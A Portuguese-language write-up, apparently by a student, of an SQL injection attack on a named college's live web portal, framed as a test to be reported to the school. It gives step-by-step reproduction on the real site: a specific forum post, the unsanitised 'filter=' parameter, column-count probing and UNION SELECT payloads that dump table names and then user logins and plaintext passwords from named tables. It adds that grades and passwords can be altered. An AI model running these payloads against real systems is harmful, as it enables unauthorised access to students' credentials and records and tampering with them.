# **SQL Injection - FACULDADE DE AMERICANA**

SQL Injection é um método de invasão na qual códigos/comandos SQL são injetados no
banco de dados através de entradas de dados ou parâmetros. Minha intenção não foi de
invadir, mas sim de testar conhecimentos que adquiri na última semana e posteriormente
enviar o que descobri para a faculdade.

## **Informações úteis**

- Total de tabelas encontradas: 443;

- Total de colunas encontradas: 1883;

- Versão do SQL: 5.5.62-cll.

- Todas as páginas principais possuem vulnerabilidades, principalmente por terem um
parâmetro frame na URL que não é “sanitizado” devidamente, porém nenhuma
retornou todos as tabelas/colunas/informações do banco de dados SQL.

- A maioria (se não todos) os botões/links que possuem parâmetros para levar o usuário
para outra página possuem vulnerabilidades a SQL injection.

- A página de “esqueci minha senha” contém vulnerabilidades, porém não consegui
injetar SQL, ela só deu erro de sintaxe e o nome das tabelas que o servidor seleciona
para procurar pelo usuário. Suponho que o servidor substitui o ‘ por um \’.

- A página de fórum possui uma vulnerabilidade que me deu acesso à todas as
tabelas/dados do servidor (incluindo notas, usuários e senhas em texto plano e que
não contém nenhum tipo de criptografia/método de segurança) que podem ser
facilmente alterados.

## **Scripts** 

O portal da FAM não me deixa mudar parâmetros direto na URL, então para isso criei
uma extensão (funciona somente no Mozilla Firefox) que injeta elementos HTML e
JavaScript (cliente-side) no topo do portal.

![portal](https://drive.google.com/uc?export=view&id=1GuOkR6gYR2s0ERdJIZACez_kixlY2FYd)

A caixa de texto será utilizada para escrever o código que será injetado, o botão pegará o
texto e injetará no href (parâmetro de redirecionamento de um link) do < INJECT >
utilizando como base, o botão do fórum e seus parâmetros (será explicado no próximo
tópico).
Também utilizei um script em Python para extrair o nome das tabelas e colunas da página
HTML. O script lê todas as linhas do arquivo HTML salvo manualmente e verifica se
existe o texto “MensagensAtv” e depois verifica a seguinte expressão regular:

```
  regex_pattern = r'31 de dezembro de 1969, ([-_A-Za-z0-9]+)</td>'
```

Após todas as linhas serem lidas, o programa cria um arquivo .txt e escreve todos os
resultados encontrados pela expressão regular.

## Vulnerabilidades

Embora todas as páginas que possuem parâmetros que não serão limpos possuem uma
vulnerabilidade, a página com maior risco foi o fórum. Clicando no fórum, abrindo uma
postagem aleatória (no meu caso foi a postagem COMUNIDADE EAD com ID: 7973).
No campo de “Ordenar por”, selecione “filtrar por usuário” e clique em algum botão
escrito “responder”. Clicando no botão, um erro de sintaxe SQL aparecerá na tela.

![portal](https://drive.google.com/uc?export=view&id=1U2tHfoWovv7DRS5_klM64moD4v-kaFhk)

Se escrevermos qualquer coisa no parâmetro “filter=” do botão do fórum, o SQL
interpretará como parte do código e assim podemos injetar códigos que originalmente não
estavam no SQL da FAM.
Utilizando minha extensão, qualquer coisa que for escrita no campo de texto será injetada
no servidor SQL. Para descobrirmos todos os nomes da tabela por exemplo, primeiro
precisamos do total de colunas, para isso é preciso testar manualmente de um a um o
comando:

```
  'string'order by X-- -%
```

Onde X é um número. Caso o SQL não retorne nenhum erro, então a coluna existe e
podemos passar para o próximo número (X+1), caso contrário, a coluna não existe e o
número de colunas é X-1.
Sabendo o número de colunas, podemos assim injetar mais códigos mais graves como o
de pegar todos os nomes de tabelas existentes:

``` 
  'string' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,concat(coluna) from tabela LIMIT 1, 500;-- -%
```

O resultado desta query será várias postagens desconhecidas com a data de 31, de
dezembro de 1969 (epoch padrão de um computador) acompanhadas do nome das
tabelas.

![portal](https://drive.google.com/uc?export=view&id=1zN9PRl5DCCrDirpysKyPmXxMgEnG1rGY)

Utilizando o meu script em Python, podemos retirar o nome de todas as tabelas e criar
um arquivo com elas. O resultado será assim:

![portal](https://drive.google.com/uc?export=view&id=1rRq6IAuhdEcEBxszi-2XFzL1ZNSzNDU9)

Como sabemos o nome de todas as tabelas, agora precisamos de suas respectivas
colunas. Podemos pegá-las usando o seguinte comando:

```
 'string' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,column_name from information_schema.columns;-- -%
```

O script também consegue filtrar o nome de colunas.

![portal](https://drive.google.com/uc?export=view&id=1RdeAyAOW-CM5ounCEofAQ5oWPuMLWz_t)

Com o nome das colunas e tabelas, podemos injetar o mesmo código, porém selecionando
a coluna da tabela que queremos para conseguir qualquer informação. Podemos por
exemplo, listar todos os usuários registrados no site através de:

```
  'string' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,login_user from portal_cadastro_dados;-- -%
```

Ou todas as senhas dos usuários, que por sinal estão em texto sem nenhum tipo de
criptografia/hash ou nenhum tipo de segurança.

```
  'string' union select 1,2,3,4,5,6,7,8,9,10,11,12,13,login_passwd from portal_login;-- -%
```

Além de conseguir acesso a dados e informações, também é possível editar, remover e
adicionar dados nas tabelas (notas, faltas, senhas, etc).

<br/>
<br/>
<br/>
<br/>


